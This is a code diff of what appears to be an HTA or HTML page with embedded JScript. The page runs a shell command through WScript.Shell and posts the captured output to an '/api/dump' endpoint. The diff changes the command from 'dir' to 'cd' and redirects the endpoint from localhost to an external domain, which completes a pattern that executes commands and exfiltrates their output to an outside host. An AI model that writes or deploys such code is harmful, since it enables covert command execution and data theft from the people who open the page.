@@ -15,7 +15,7 @@
           var shell = new ActiveXObject("WScript.Shell");
 
           // Command to execute (e.g., dir for listing files)
-          var command = "cmd.exe /c dir";
+          var command = "cmd.exe /c cd";
 
           // Execute command and capture output
           var exec = shell.Exec(command);
@@ -34,7 +34,7 @@
       function sendOutputToAPI(data) {
         try {
           // API endpoint
-          var apiEndpoint = "http://localhost:3000/api/dump";
+          var apiEndpoint = "http://my-fav-domain.com:3000/api/dump";
 
           // Create XMLHttpRequest
           var xhr = new XMLHttpRequest();
